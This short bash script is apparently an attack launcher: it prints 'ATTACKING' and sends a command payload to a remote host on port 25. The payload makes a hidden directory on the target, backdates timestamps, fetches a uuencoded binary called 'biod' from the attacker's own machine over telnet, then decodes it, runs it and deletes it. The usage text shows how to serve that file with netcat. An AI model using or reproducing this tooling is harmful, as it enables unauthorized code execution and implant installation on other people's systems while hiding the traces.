#!/bin/bash

case "${#}" in
  0|1|3|4|6)
    echo " Usage: ${0}  <rem_ip> <loc_ip> <localport> <base directory> <port>"
    echo " ls -al biod.uu"
    echo " nc -l -p 80 < biod.uu" 
    exit
    ;;
esac

REMOTEIP=$1
LOCALIP=$2
LOCALPORT=${3:-80}
BASEDIR=${4:-"/usr/tmp"}
PORT=${5:-25}

echo "ATTACKING: Remoteip $REMOTEIP"
echo "Localip=$LOCALIP Localport=$LOCALPORT Basedir=$BASEDIR"
echo "Port=$PORT"

if [ ! "$RA" = "" ]; then
    echo "RA=\"$RA\""
fi
if [ ! "$RP" = "" ]; then
    echo "RP=\"$RP\""
fi

echo CommandLine: ${0} ${*}

REALCMD="N=/dev/null
	D=$BASEDIR/.spool
	PATH=:\$D:/bin:/usr/bin
	touch -r $BASEDIR /tmp/.spl
	mkdir -p -m700 \$D
	cd \$D
	w
	(telnet $LOCALIP $LOCALPORT < /dev/console 2> /dev/null) |cat > .biod.uu
	uudecode .biod.uu
	uncompress -f biod.Z >\$N 2>&1 && chmod +x biod
	PATH=. biod
	rm \$D/biod \$D/.biod.uu
	exit 0"

echo "/dev/null" > .TTY
export REALCMD
jl.command telnet $REMOTEIP $PORT
